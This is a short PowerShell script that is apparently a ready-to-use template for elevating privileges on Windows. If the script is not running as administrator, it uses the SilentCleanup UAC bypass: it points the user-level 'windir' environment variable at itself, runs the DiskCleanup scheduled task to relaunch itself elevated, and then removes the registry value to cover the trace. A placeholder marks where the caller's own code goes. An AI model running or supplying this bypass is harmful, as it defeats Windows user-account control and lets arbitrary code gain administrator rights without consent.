function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "[INFO] Using SilentCleanup bypass..." -ForegroundColor Yellow
    
    reg add "HKCU\Environment" /v "windir" /t REG_SZ /d "$PSCommandPath" /f | Out-Null
    schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /i | Out-Null
    Start-Sleep 3
    reg delete "HKCU\Environment" /v "windir" /f | Out-Null
    exit
}

Write-Host "`n[+] Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
